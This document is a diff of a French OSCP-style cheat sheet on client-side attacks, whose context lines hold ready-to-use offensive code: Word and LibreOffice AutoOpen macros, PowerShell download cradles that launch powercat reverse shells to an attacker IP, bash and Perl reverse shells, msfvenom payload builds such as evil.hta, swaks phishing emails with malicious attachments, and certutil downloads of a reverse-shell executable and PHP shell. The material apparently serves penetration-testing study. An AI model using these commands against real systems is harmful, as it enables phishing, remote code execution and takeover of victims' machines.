@@ -11,7 +11,7 @@ Comprendre les vecteurs d'interaction avec les postes utilisateurs.
 ## MACROS
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
+
 
 ```text
 Sub AutoOpen()
@@ -45,14 +45,14 @@ End Sub
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil iex.</p>
+
 
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « MACROS ».</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « MACROS ».</p>
 
 ```powershell
 $text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
@@ -61,7 +61,7 @@ Write-Output $encoded
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cmd_str.</p>
+<p class="oscp-command-note">Script Python lié à « MACROS ».</p>
 
 ```python
 cmd_str = "[Your Base64 Encoded PowerShell Command]"
@@ -73,7 +73,7 @@ for i in range(0, len(cmd_str), chunk_size):
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
+
 
 ```text
 Sub AutoOpen()
@@ -102,14 +102,14 @@ End Sub
 Observer les permissions et la configuration de Windows.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil wsgidav.</p>
+
 
 ```bash
 wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil powershell.exe.</p>
+<p class="oscp-command-note">Exécuter un script PowerShell.</p>
 
 ```powershell
 # Create the file as a shortcut in the Windows system to prepare the attack
@@ -121,7 +121,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 `.Library-ms`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Windows Library Files ».</p>
+<p class="oscp-command-note">Extrait XML lié à « Windows Library Files ».</p>
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -149,7 +149,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 ## Avancé Exploitation
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
+
 
 ```text
 Sub AutoOpen()
@@ -186,7 +186,7 @@ End Sub
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Avancé Exploitation ».</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « Avancé Exploitation ».</p>
 
 ```powershell
 # Using Encodings
@@ -207,7 +207,7 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil var.</p>
+<p class="oscp-command-note">Extrait JavaScript lié à « Avancé Exploitation ».</p>
 
 ```javascript
 var cmd = "";
@@ -217,7 +217,7 @@ eval(cmd);
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
+<p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>
 
 ```powershell
 net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
@@ -227,7 +227,7 @@ net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
 ### Courriel simple
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
+<p class="oscp-command-note">Examiner la configuration SMTP.</p>
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -244,7 +244,7 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 ### Courriel avec authentification
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
+<p class="oscp-command-note">Examiner la configuration SMTP.</p>
 
 ```bash
 sudo swaks -t <recipient@example.com> --from <sender@example.com> \
@@ -254,7 +254,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil --auth.</p>
+
 
 ```text
 --auth LOGIN
@@ -268,7 +268,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 ### Email with Custom Headers for Social Engineering
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
+<p class="oscp-command-note">Examiner la configuration SMTP.</p>
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -284,7 +284,7 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 ### Alternative Tool sendemail
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sendemail.</p>
+
 
 ```bash
 sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
@@ -330,7 +330,7 @@ Moderate · Moderate · Moderate · Simple
 Examiner les permissions et la configuration de Linux.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
+<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
 echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh
@@ -352,14 +352,14 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
+
 
 ```text
 -f elf
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -o.</p>
+
 
 ```text
 -o shell.elf
@@ -370,7 +370,7 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 `shell.elf`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sub.</p>
+
 
 ```text
 Sub RunShell
@@ -384,7 +384,7 @@ End Sub
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
+<p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
 python3 -m http.server 80
@@ -395,7 +395,7 @@ python3 -m http.server 80
 `update.odt`  
 
 
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
 nc -lvnp 4444
@@ -406,7 +406,7 @@ nc -lvnp 4444
 `swaks`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
+<p class="oscp-command-note">Examiner la configuration SMTP.</p>
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -427,21 +427,21 @@ swaks --to target@example.com --from emmanuel@example.com \
 Observer les permissions et la configuration de Windows.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
+
 
 ```text
 -f hta-psh
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -o.</p>
+
 
 ```text
 -o evil.hta
@@ -453,7 +453,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 `exe`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
+
 
 ```text
 -f exe -o evil.exe
@@ -464,7 +464,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 `vbs`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
+
 
 ```text
 -f vbs -o evil.vbs
@@ -475,7 +475,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 `ps1`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
+
 
 ```text
 -f ps1 -o script.ps1
@@ -486,7 +486,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 `dll`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -f.</p>
+
 
 ```text
 -f dll -o payload.dll
@@ -497,7 +497,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 `evil.hta`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil s.</p>
+<p class="oscp-command-note">Script Python lié à « Cibles Windows ».</p>
 
 ```python
 # Python script to split the payload into 50-character chunks
@@ -515,7 +515,7 @@ for i in range(0, len(s), n):
 `Security`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil macro.</p>
+
 
 ```text
 Macro Security
@@ -526,14 +526,14 @@ Macro Security
 `Tools` · `Macros`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil organize.</p>
+
 
 ```text
 Organize Macros
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil libreoffice.</p>
+
 
 ```text
 LibreOffice Basic
@@ -544,7 +544,7 @@ LibreOffice Basic
 `Exploit`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil rem.</p>
+
 
 ```text
 REM ***** BASIC *****
@@ -560,7 +560,7 @@ End Sub
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Cibles Windows ».</p>
+
 
 ```text
 <INSERT_YOUR_PAYLOAD_CHUNKS>
@@ -571,7 +571,7 @@ End Sub
 `-nop`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -w.</p>
+
 
 ```text
 -w hidden
@@ -582,7 +582,7 @@ End Sub
 `Shell`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil shell.</p>
+
 
 ```text
 Shell Str, 1
@@ -603,14 +603,14 @@ Shell Str, 1
 `Shell`  
 
 
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute avec Netcat.</p>
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
 nc -lvnp 444
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil swaks.</p>
+<p class="oscp-command-note">Examiner la configuration SMTP.</p>
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -625,14 +625,14 @@ swaks --to target@example.com --from emmanuel@example.com \
 `exploit.ods`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
+<p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 
-<p class="oscp-command-note">Afficher des informations de la session ou du système.</p>
+<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
 ```bash
 systeminfo
@@ -641,7 +641,7 @@ ipconfig /all
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cd.</p>
+<p class="oscp-command-note">Changer de répertoire.</p>
 
 ```text
 cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
